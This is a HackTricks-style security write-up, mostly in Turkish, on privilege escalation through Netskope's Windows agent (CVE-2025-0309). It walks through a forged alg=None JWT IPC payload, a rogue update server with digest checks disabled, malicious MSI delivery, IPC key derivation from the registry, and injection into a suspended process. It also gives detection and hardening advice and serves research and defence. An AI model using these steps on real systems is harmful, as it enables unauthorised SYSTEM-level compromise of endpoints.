# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük sürtünmeli bir IPC yüzeyi ve ayrıcalıklı bir update akışı açığa çıkaran kurumsal endpoint agentları ve updateler içinde bulunan Windows local privilege escalation zincirleri sınıfını genelleştirir. Temsilî bir örnek, düşük ayrıcalıklı bir kullanıcının enrollment'ı bir saldırgan kontrolündeki sunucuya zorlayabildiği ve ardından SYSTEM servisinin kurduğu kötü amaçlı bir MSI teslim edebildiği Netskope Client for Windows < R129 (CVE-2025-0309)′dır.

Yeniden kullanabileceğiniz ana fikirler:
- Bir privileged servisinin localhost IPC'sini, re‑enrollment veya yeniden yapılandırmayı saldırgan sunucuya zorlamak için kötüye kullanın.
- Vendor’ın update endpointlerini implemente edin, rogue Trusted Root CA teslim edin ve updater'ı kötü amaçlı, “signed” pakete yönlendirin.
- Zayıf signer kontrollerinden (CN allow‑lists), opsiyonel digest flag'lerden ve gevşek MSI properties'den kaçının.
- IPC “encrypted” ise, registry'de saklanan world‑readable makine tanımlayıcılarından key/IV türetin.
- Servis çağıranları image path/process name ile sınırlandırıyorsa, allow‑listed bir process'e inject edin veya bir tane suspended olarak spawn edip DLL'inizi minimal bir thread‑context patch ile bootstrap edin.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Birçok agent, SYSTEM servisine localhost TCP üzerinden JSON konuşan bir user‑mode UI process ile gelir.

Netskope'de gözlemlendi:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Backend host'u (ör. AddonUrl) kontrol eden claim'lere sahip bir JWT enrollment token'ı craft edin. Alg olarak alg=None kullanın, böylece imza gerekmez.
2) JWT ve tenant adı ile provisioning komutunu çağıran IPC mesajını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için sahte sunucunuza istek göndermeye başlar, ör.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer caller verification path/name‑based ise, isteği allow‑listed vendor binary'den başlatın (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

İstemci sunucunuzla iletişim kurduktan sonra, beklenen endpoint'leri uygulayın ve onu saldırgan MSI'ye yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir güncelleme aralığı içeren JSON konfigürasyonu döndürün, örn.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA sertifikası döndürür. Servis bunu Local Machine Trusted Root store into yükler.
3) /v2/checkupdate → Zararlı bir MSI'ya ve sahte bir sürüme işaret eden metadata sağlar.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: servis sadece Subject CN'nin “netSkope Inc” veya “Netskope, Inc.” olup olmadığını kontrol ediyor olabilir. Sizin sahte CA'nız bu CN ile bir leaf verebilir ve MSI'yı imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI özelliği ekleyin. Kurulum sırasında uygulanmıyor.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ekstra kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI'nızı
C:\ProgramData\Netskope\stAgent\data\*.msi
konumundan kurar ve NT AUTHORITY\SYSTEM olarak rastgele kod çalıştırır.

---
## 3) Forging encrypted IPC requests (when present)

R127'den itibaren, Netskope IPC JSON'u Base64 benzeri görünen encryptData alanına sarmıştı. Tersine mühendislik AES ve anahtar/IV'in herhangi bir kullanıcı tarafından okunabilen registry değerlerinden türetildiğini gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden üretebilir ve standart bir kullanıcıdan geçerli şifreli komutlar gönderebilir. Genel ipucu: bir agent aniden IPC'sini “şifreliyorsa”, HKLM altında device ID'ler, product GUID'leri, install ID'ler gibi materyallere bakın.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Bazı servisler TCP bağlantısının PID'sini çözerek eş tarafı authenticate etmeye çalışır ve image path/name'i Program Files altında bulunan izinli vendor ikili dosyalarla (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırır.

İki pratik bypass:
- izinli bir süreçe (ör. nsdiag.exe) DLL injection yapıp IPC'yi içinden proxy'leyin.
- izinli bir ikiliyi suspended olarak spawn edin ve CreateRemoteThread kullanmadan proxy DLL'inizi bootstrap ederek driver‑enforced tamper kurallarını sağlayın (bkz §5).

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Ürünler genelde protected süreçlere ait handle'lardan tehlikeli hakları temizlemek için bir minifilter/OB callbacks driver ile gelir (ör. Stadrv):
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlı tutar

Bu kısıtlamalara saygı gösteren güvenilir bir user‑mode loader:
1) Vendor ikili dosyasını CREATE_SUSPENDED ile CreateProcess edin.
2) Hâlâ almanıza izin verilen handle'ları edinin: process için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve bir thread handle'ı için THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya bilinen bir RIP'te kodu patchliyorsanız sadece THREAD_RESUME).
3) ntdll!NtContinue (veya başka erken, garantiyle map edilmiş thunk) üzerine küçük bir stub yazın; bu stub DLL yolunuzda LoadLibraryW çağırıp sonra geri zıplasın.
4) ResumeThread ile stub'unuzun in‑process tetiklenmesini sağlayın ve DLL'inizi yükleyin.

Zaten korunmuş bir süreç üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (süreci siz oluşturdunuz), driver politikası sağlanmış olur.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) sahte CA, zararlı MSI imzalama sürecini otomatikleştirir ve gerekli endpoint'leri sunar: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope, isteğe bağlı olarak AES‑şifreli olabilen rastgele IPC mesajları üreten ve izinli bir ikili üzerinden kökenlenmesi için suspended‑process injection içeren özel bir IPC client/exploit'tir.

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root'a eklemeleri izleyin. Sysmon + registry‑mod eventing (bkz SpecterOps guidance) iyi çalışır.
- Ajan servisi tarafından C:\ProgramData\<vendor>\<agent>\data\*.msi gibi yollarından başlatılan MSI çalıştırmalarını işaretleyin.
- Beklenmeyen enrollment host/tenant'lar için ajan loglarını inceleyin, örn: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant anomalilerine ve provisioning msg 148'e bakın.
- Beklenen imzalı ikililer olmayan veya sıra dışı child process tree'lerinden gelen localhost IPC client'ları için alarm oluşturun.

---
## Hardening tips for vendors
- Enrollment/update host'larını sıkı bir allow‑list'e bağlayın; client code içinde güvenilmeyen domainleri reddedin.
- IPC peer'lerini image path/name kontrolleri yerine OS primitifleriyle authenticate edin (ALPC security, named‑pipe SIDs).
- Gizli materyalleri world‑readable HKLM'de tutmayın; eğer IPC şifrelenmek zorundaysa anahtarları protected secret'lardan türetin veya authenticated kanallarda müzakere edin.
- Updater'ı bir supply‑chain yüzeyi olarak değerlendirin: kontrol ettiğiniz güvenilir bir CA'ya tam zincir gerektirin, paket imzalarını pinned key'lere karşı doğrulayın ve config'te doğrulama devre dışıysa kapatın (fail closed).

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
